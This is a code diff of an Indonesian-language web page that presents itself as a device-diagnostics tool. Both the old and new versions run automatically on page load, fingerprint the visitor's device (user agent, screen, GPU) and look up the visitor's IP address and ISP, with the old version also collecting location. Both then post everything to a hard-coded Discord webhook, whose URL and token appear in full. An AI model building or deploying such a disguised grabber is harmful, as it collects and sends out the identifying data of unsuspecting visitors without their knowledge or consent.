@@ -3,70 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Diagnosa Perangkat Pro</title>
+    <title>Advanced Device Intelligence</title>
     <style>
-        body { 
-            font-family: 'Inter', -apple-system, sans-serif; 
-            background: #0f172a; 
-            color: #f8fafc; 
-            margin: 0; 
-            padding: 20px; 
-            display: flex; 
-            justify-content: center;
-            min-height: 100vh;
-            align-items: center;
-        }
-        .card { 
-            background: #1e293b; 
-            padding: 25px; 
-            border-radius: 16px; 
-            width: 100%; 
-            max-width: 500px; 
-            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); 
-            border: 1px solid #334155; 
-        }
-        h2 { 
-            color: #38bdf8; 
-            text-align: center; 
-            margin-top: 0; 
-            margin-bottom: 20px;
-            font-size: 22px; 
-        }
-        .info-group { 
-            background: #0f172a; 
-            padding: 12px 16px; 
-            border-radius: 8px; 
-            margin-bottom: 12px; 
-            border-left: 4px solid #38bdf8;
-        }
-        .label { 
-            color: #64748b; 
-            font-size: 11px; 
-            text-transform: uppercase; 
-            letter-spacing: 1px; 
-            font-weight: 700; 
-            display: block; 
-            margin-bottom: 6px; 
-        }
-        .value { 
-            color: #e2e8f0; 
-            font-size: 14px; 
-            word-break: break-word; 
-            font-weight: 500; 
-            display: block; 
-            line-height: 1.5; 
-        }
-        .status { 
-            text-align: center; 
-            padding: 12px; 
-            border-radius: 8px; 
-            font-size: 13px; 
-            font-weight: bold; 
-            margin-top: 20px;
-        }
-        .success { background: rgba(52, 211, 153, 0.1); color: #34d399; border: 1px solid rgba(52, 211, 153, 0.3); }
-        .loading { background: rgba(251, 191, 36, 0.1); color: #fbbf24; border: 1px solid rgba(251, 191, 36, 0.3); }
-        .error { background: rgba(239, 68, 68, 0.1); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
+        body { font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; display: flex; justify-content: center; min-height: 100vh; align-items: center; }
+        .card { background: #1e293b; padding: 25px; border-radius: 16px; width: 100%; max-width: 550px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); border: 1px solid #334155; }
+        h2 { color: #38bdf8; text-align: center; margin-bottom: 20px; }
+        .info-group { background: #0f172a; padding: 12px 16px; border-radius: 8px; margin-bottom: 10px; border-left: 4px solid #38bdf8; }
+        .label { color: #64748b; font-size: 11px; text-transform: uppercase; font-weight: 700; display: block; }
+        .value { color: #e2e8f0; font-size: 14px; font-weight: 500; display: block; margin-top: 4px; }
+        .status { text-align: center; padding: 12px; border-radius: 8px; font-size: 13px; font-weight: bold; margin-top: 20px; }
+        .success { background: rgba(52, 211, 153, 0.1); color: #34d399; }
+        .loading { background: rgba(251, 191, 36, 0.1); color: #fbbf24; }
     </style>
 </head>
 <body>
@@ -80,7 +27,7 @@
     </div>
 
     <div class="info-group">
-        <span class="label">Chipset (SoC)</span>
+        <span class="label">Chipset & Hardware</span>
         <span id="ui-chipset" class="value">Menganalisis...</span>
     </div>
 
@@ -90,148 +37,108 @@
     </div>
 
     <div class="info-group">
-        <span class="label">Alamat IP & ISP</span>
-        <span id="ui-network" class="value">Menghubungkan...</span>
+        <span class="label">Screen Details (Res/DPI)</span>
+        <span id="ui-screen" class="value">Menghitung...</span>
     </div>
 
     <div class="info-group">
-        <span class="label">Lokasi</span>
-        <span id="ui-location" class="value">Melacak...</span>
+        <span class="label">Network & IP</span>
+        <span id="ui-network" class="value">Menghubungkan...</span>
     </div>
 
-    <div id="status" class="status loading">
-        ⚙️ Sedang Memproses Data...
-    </div>
+    <div id="status" class="status loading">⚙️ Memproses Data...</div>
 </div>
 
 <script>
-    // GANTI URL WEBHOOK DI BAWAH INI
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
 
-    function getDetailedDeviceData() {
-        const width = window.screen.width;
-        const height = window.screen.height;
-        const ratio = window.devicePixelRatio;
-        const platform = navigator.platform;
-
-        // 1. DETEKSI IPHONE BERDASARKAN RESOLUSI (FINGERPRINTING)
-        if (/iPhone|iPad|iPod/.test(navigator.userAgent) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
-            // Database Resolusi iPhone
-            if (ratio === 3) {
-                if (width === 430 && height === 932) return { name: "iPhone 15/16 Pro Max", chipset: "Apple A17/A18 Pro", brand: "Apple" };
-                if (width === 393 && height === 852) return { name: "iPhone 15/16 Pro", chipset: "Apple A17/A18 Pro", brand: "Apple" };
-                if (width === 428 && height === 926) return { name: "iPhone 13/14 Pro Max", chipset: "Apple A15/A16 Bionic", brand: "Apple" };
-                if (width === 390 && height === 844) return { name: "iPhone 13/14 / 15", chipset: "Apple A15/A16 Bionic", brand: "Apple" };
-                if (width === 414 && height === 896) return { name: "iPhone 11 Pro Max / XS Max", chipset: "Apple A12/A13 Bionic", brand: "Apple" };
-            } else if (ratio === 2) {
-                if (width === 375 && height === 667) return { name: "iPhone SE (2nd/3rd Gen)", chipset: "Apple A13/A15 Bionic", brand: "Apple" };
-                if (width === 414 && height === 896) return { name: "iPhone 11 / XR", chipset: "Apple A12/A13 Bionic", brand: "Apple" };
-            }
-            return { name: "iPhone (Generic)", chipset: "Apple Silicon", brand: "Apple" };
-        }
-
-        // 2. DETEKSI ANDROID (USER AGENT PARSING)
-        const ua = navigator.userAgent;
-        const androidMatch = ua.match(/Android\s+([^\s;]+);?\s+([^;]+)\s+Build/);
-        if (androidMatch) {
-            return { name: androidMatch[2], chipset: "Menganalisis GPU...", brand: "Android" };
-        }
-
-        return { name: platform, chipset: "Unknown", brand: "Desktop/Other" };
-    }
-
-    function getGPUInfo() {
+    function getGPUData() {
         try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (!gl) return { renderer: "N/A", chipset: "N/A" };
+            if (!gl) return { renderer: "WebGL Unsupported", vendor: "Unknown" };
 
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_INFO) : gl.getParameter(gl.RENDERER);
-            
-            let detectedChipset = "Unknown SoC";
-            
-            if (renderer.includes('Adreno')) {
-                const model = renderer.match(/Adreno\s*\(TM\)\s*(\d+)/);
-                detectedChipset = model ? `Qualcomm Snapdragon (Adreno ${model[1]})` : "Qualcomm Snapdragon";
-            } else if (renderer.includes('Mali')) {
-                detectedChipset = "MediaTek / Exynos (Mali GPU)";
-            } else if (renderer.includes('Apple')) {
-                detectedChipset = "Apple Bionic / Pro Chips";
-            }
-
-            return { renderer, detectedChipset };
+            return {
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_INFO) : gl.getParameter(gl.RENDERER),
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_INFO) : gl.getParameter(gl.VENDOR)
+            };
         } catch (e) {
-            return { renderer: "Error", chipset: "Error" };
-        }
-    }
-
-    async function fetchNetworkInfo() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            return await res.json();
-        } catch (e) {
-            return null;
+            return { renderer: "Detection Blocked", vendor: "Unknown" };
         }
     }
 
     async function startCapture() {
-        const deviceBase = getDetailedDeviceData();
-        const gpuData = getGPUInfo();
-        const net = await fetchNetworkInfo();
+        const gpu = getGPUData();
+        const screenW = window.screen.width;
+        const screenH = window.screen.height;
+        const dpr = window.devicePixelRatio;
+        const ua = navigator.userAgent;
+        
+        let brand = "Unknown";
+        let model = navigator.platform;
+        let chipset = "Unknown SoC";
 
-        const data = {
-            product: deviceBase.name,
-            brand: deviceBase.brand,
-            chipset: deviceBase.brand === "Apple" ? deviceBase.chipset : gpuData.detectedChipset,
-            gpu: gpuData.renderer,
-            ip: net ? net.ip : "Unknown",
-            isp: net ? net.org : "Unknown",
-            location: net ? `${net.city}, ${net.region}, ${net.country_name}` : "Unknown",
-            ua: navigator.userAgent
-        };
+        // 1. Logika Deteksi iPhone via Resolusi
+        if (/iPhone|iPad/.test(ua)) {
+            brand = "Apple";
+            if (dpr === 3) {
+                if (screenW === 430 || screenH === 932) model = "iPhone 15/16 Pro Max";
+                else if (screenW === 393 || screenH === 852) model = "iPhone 15/16 Pro";
+                else if (screenW === 428 || screenH === 926) model = "iPhone 13/14 Pro Max";
+                else if (screenW === 390 || screenH === 844) model = "iPhone 13/14/15";
+                else model = "iPhone (High-End)";
+            } else {
+                model = "iPhone/iPad (Standard)";
+            }
+            chipset = "Apple Silicon Bionic";
+        } 
+        // 2. Logika Deteksi Android
+        else if (/Android/.test(ua)) {
+            const match = ua.match(/Android\s+([^\s;]+);?\s+([^;]+)\s+Build/);
+            brand = "Android Device";
+            model = match ? match[2] : "Generic Android";
+            
+            if (gpu.renderer.includes("Adreno")) chipset = "Qualcomm Snapdragon";
+            else if (gpu.renderer.includes("Mali")) chipset = "MediaTek / Exynos";
+        }
+
+        // 3. Info Jaringan
+        let ipData = { ip: "Gagal mendeteksi", org: "Unknown" };
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            ipData = await res.json();
+        } catch (e) {}
 
         // Update UI
-        document.getElementById('ui-product').innerText = data.product;
-        document.getElementById('ui-chipset').innerText = data.chipset;
-        document.getElementById('ui-gpu').innerText = data.gpu;
-        document.getElementById('ui-network').innerText = `${data.ip}\n${data.isp}`;
-        document.getElementById('ui-location').innerText = data.location;
+        document.getElementById('ui-product').innerText = `${brand} - ${model}`;
+        document.getElementById('ui-chipset').innerText = chipset;
+        document.getElementById('ui-gpu').innerText = gpu.renderer;
+        document.getElementById('ui-screen').innerText = `${screenW}x${screenH} px (Ratio: ${dpr})`;
+        document.getElementById('ui-network').innerText = `${ipData.ip} (${ipData.org})`;
 
         // Kirim ke Discord
-        sendToDiscord(data);
+        const payload = {
+            embeds: [{
+                title: "🚨 Perangkat Terdeteksi",
+                color: 2326507,
+                fields: [
+                    { name: "📱 Perangkat", value: `**Brand:** ${brand}\n**Model:** ${model}\n**Platform:** ${navigator.platform}`, inline: true },
+                    { name: "⚙️ Hardware", value: `**Chipset:** ${chipset}\n**GPU:** ${gpu.renderer}`, inline: true },
+                    { name: "🖥️ Layar", value: `**Resolusi:** ${screenW}x${screenH}\n**DPI/DPR:** ${dpr}`, inline: true },
+                    { name: "🌐 Jaringan", value: `**IP:** ${ipData.ip}\n**ISP:** ${ipData.org}`, inline: false },
+                    { name: "🔧 User Agent", value: `\`\`\`${ua}\`\`\`` }
+                ]
+            }]
+        };
+
+        fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        
+        document.getElementById('status').innerText = "✅ Selesai";
+        document.getElementById('status').className = "status success";
     }
 
-    async function sendToDiscord(data) {
-        try {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "📱 Detail Perangkat Terdeteksi",
-                        color: 5814783,
-                        fields: [
-                            { name: "Device", value: `**Brand:** ${data.brand}\n**Model:** ${data.product}`, inline: true },
-                            { name: "Hardware", value: `**SoC:** ${data.chipset}\n**GPU:** ${data.gpu}`, inline: true },
-                            { name: "Network", value: `**IP:** ${data.ip}\n**ISP:** ${data.isp}`, inline: false },
-                            { name: "Location", value: data.location, inline: false },
-                            { name: "User Agent", value: `\`\`\`${data.ua}\`\`\`` }
-                        ],
-                        footer: { text: "System Time: " + new Date().toLocaleString() }
-                    }]
-                })
-            });
-            document.getElementById('status').innerText = "✅ Data Berhasil Terkirim";
-            document.getElementById('status').className = "status success";
-        } catch (e) {
-            document.getElementById('status').innerText = "❌ Gagal Mengirim Data";
-            document.getElementById('status').className = "status error";
-        }
-    }
-
-    window.onload = startCapture;
+    window.onload = () => setTimeout(startCapture, 500);
 </script>
-
 </body>
 </html>
